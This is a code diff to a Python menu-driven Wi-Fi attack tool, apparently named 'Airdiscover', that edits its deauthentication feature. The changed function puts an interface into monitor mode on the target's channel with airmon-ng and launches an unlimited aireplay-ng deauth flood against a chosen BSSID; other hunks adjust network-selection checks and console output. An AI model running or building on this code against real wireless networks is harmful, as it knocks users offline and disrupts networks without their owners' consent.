@@ -122,17 +122,18 @@ def banners():
     print(select)
 
 
-def load_ddos(bss, monitor_num):
+def load_ddos(bss, chh, monitor_num):
     def load_dos():
         print(Fore.BLUE+'[*]'+Fore.RESET+' Starting Deauth Attack, Press CTRL + C To Stop...')
         time.sleep(1)
+        subprocess.run(["airmon-ng", "start", monitor_num, chh])
         subprocess.run(["xterm", "-T", "Deauth Attack (Airdiscover)", "-e", "aireplay-ng", "--deauth", "0", "-a", bss, monitor_num])
     load_dos()
 def ddos_attacks(monitor):
     def load_dos_attack():
-        load_ddos(BSSID, monitor)
-    if monitor == "None":
-        print(Fore.RED+'[-]'+Fore.RESET+' No Monitor Mode Detected.')
+        load_ddos(BSSID, CHANNEL, monitor)
+    if ESSID == "None" or BSSID == "None" or MONITORED_INTERFACE == "None":
+        print(Fore.RED+'[-]'+Fore.RESET+' Please Select a Network!')
     else:
         pass
     if INTERFACE == "":
@@ -162,7 +163,7 @@ def config():
 -------------------{Fore.CYAN}
 Interface: {Fore.GREEN}{INTERFACE}{Fore.CYAN}
 Target BSSID: {BSSID}
-Target ESSID: {ESSID}
+Target ESSID:{ESSID}
 Channel: {CHANNEL}
 Target Encryption: WPA, WPA2, WEP{Fore.LIGHTBLUE_EX}
 -------------------{Fore.RESET}
@@ -185,7 +186,8 @@ Optional features, attacks ({Fore.RED}MONITOR MODE{Fore.LIGHTBLUE_EX})
 
 
 
-
+os.system("clear")
+banners()
 def clear_print():
     os.system('clear')
     banners()
@@ -210,7 +212,7 @@ while True:
             if "....." in top or "......" in top:
                 top+=Fore.GREEN+'ok'+Fore.RESET
             time.sleep(0.2)
-            sys.stdout.write(f"Cleaning up temporary files{top}")
+            sys.stdout.write(f"\rCleaning up temporary files{top}")
         write_to_log("remove_log")
     elif selection_attack == 1:
         print(Fore.LIGHTBLUE_EX+'Killing Processes...'+Fore.RESET)
